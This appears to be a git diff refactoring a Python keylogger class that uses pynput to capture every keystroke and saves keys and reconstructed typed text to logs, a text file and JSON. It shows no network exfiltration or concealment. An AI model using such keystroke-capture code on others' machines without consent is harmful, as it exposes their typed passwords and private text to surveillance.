@@ -4,26 +4,24 @@
 
 # if o pc for windows:
 # from pynput.keyboard._win32 import KeyCode
-
 from pynput.keyboard import Listener
-from Functions.JSONLib import JSONLib
 from Loggers.Logger import Logger
-from Loggers.Stacker import Stacker
+from Settings.initializer import stacker
+from Functions.JSONLib import JSONLib
+from Settings.config import keyboard_mouse
 
-json = JSONLib()
-keyboard = "Keyboard"
-logger = Logger(keyboard)
-stacker = Stacker(keyboard)
 
-class KeyLogger():
+class KeyLogger:
 
     def __init__(self):
         self.keys = []
         self.text = ""
+        self.logger = Logger(keyboard_mouse)
+        self.json = JSONLib()
         
     def __set_keys(self, key: str, **kwargs) -> None:
         self.keys.append(key)
-        logger.info(message=f"'{key}'", **kwargs)
+        self.logger.info(message=f"'{key}'", **kwargs)
 
     def __set_text(self, text: str) -> None:
         self.text = text
@@ -61,7 +59,7 @@ class KeyLogger():
             self.__set_keys(self.__get_text(), text=True)
             self.__set_keys(str(key).replace("Key.", "").upper(), key_press=key, text=False)
             
-            json.save_text_data(self.__get_text(), str(key).replace("Key.", "").upper())
+            self.json.save_text_data(self.__get_text(), str(key).replace("Key.", "").upper())
             self.text = "" 
         if str(key) == "Key.cmd":
             self.__set_keys("SUPER", key_press=key, text=False)
@@ -74,13 +72,13 @@ class KeyLogger():
     # 
 
     def __on_press(self, key) -> None:
-        stacker.store_string_to_txt(key)
-        logger.debug(message=f"{key} pressed")
-        logger.info(message=f"{key}", key_press=key, text=False)
+        stacker.store_string_to_txt(f"{key}\n")
+        self.logger.debug(message=f"{key} pressed")
+        self.logger.info(message=f"{key}", key_press=key, text=False)
         self.__add_pressed_key_in_list_of_texts(str(key))
         
     def __on_release(self, key) -> None:
-        logger.debug(message=f"{key} released")
+        self.logger.debug(message=f"{key} released")
         
     def keyboard_listener(self) -> None:    
         with Listener(on_press=self.__on_press, on_release=self.__on_release) as listener:
